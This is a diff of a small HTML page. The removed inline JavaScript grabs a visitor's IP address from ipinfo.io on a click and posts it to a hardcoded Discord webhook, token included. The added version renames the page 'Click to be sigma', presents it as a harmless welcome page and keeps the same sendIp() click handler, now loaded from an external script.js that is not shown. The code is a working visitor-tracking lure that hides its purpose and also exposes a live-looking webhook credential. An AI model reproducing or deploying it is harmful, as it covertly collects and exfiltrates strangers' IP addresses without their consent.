@@ -3,56 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click to Share IP</title>
-    <style>
-        body {
-            text-align: center;
-            margin-top: 50px;
-        }
-        img {
-            cursor: pointer;
-        }
-    </style>
+    <title>Click to be sigma</title>
+    <!-- Link to external CSS file -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h2>Click the gif cause why not!</h2>
-    <!-- The image is clickable -->
-    <img src="https://chillguyfr.github.io/l/clickable_image.gif" alt="Click me!" onclick="sendIp()" />
-    
-    <script>
-        // Function to send the user's IP to the Discord webhook
-        function sendIp() {
-            // Fetch the user's IP address using ipinfo.io
-            fetch('https://ipinfo.io/json')
-                .then(response => response.json())
-                .then(data => {
-                    const userIp = data.ip; // Get the user's IP address
-                    const webhookUrl = 'https://discord.com/api/webhooks/1320679267671085117/kujMKrXa-Zhsfyr4PANPR0BX6MWeEsV73fl4kFnKik-Qfxj3hPldZnZ4EkkCpn82A_tN';
+    <div class="container">
+        <h1>Welcome!</h1>
+        <h2>Click the image below to proceed.</h2>
+        <!-- The image is clickable -->
+        <img src="https://chillguyfr.github.io/l/clickable_image.gif" alt="Click me!" onclick="sendIp()" />
+        <footer>
+            <p>Made with ❤️ for fun!</p>
+        </footer>
+    </div>
 
-                    // Create the payload to send to the Discord webhook
-                    const payload = {
-                        content: `User IP: ${userIp}`
-                    };
-
-                    // Send the IP address to the Discord webhook
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(() => alert('Your IP has been shared!'))
-                    .catch(error => {
-                        console.error('Error sending IP:', error);
-                        alert('There was an error sharing your IP.');
-                    });
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    alert('There was an error retrieving your IP address.');
-                });
-        }
-    </script>
+    <!-- Link to external JavaScript file -->
+    <script src="script.js"></script>
 </body>
 </html>
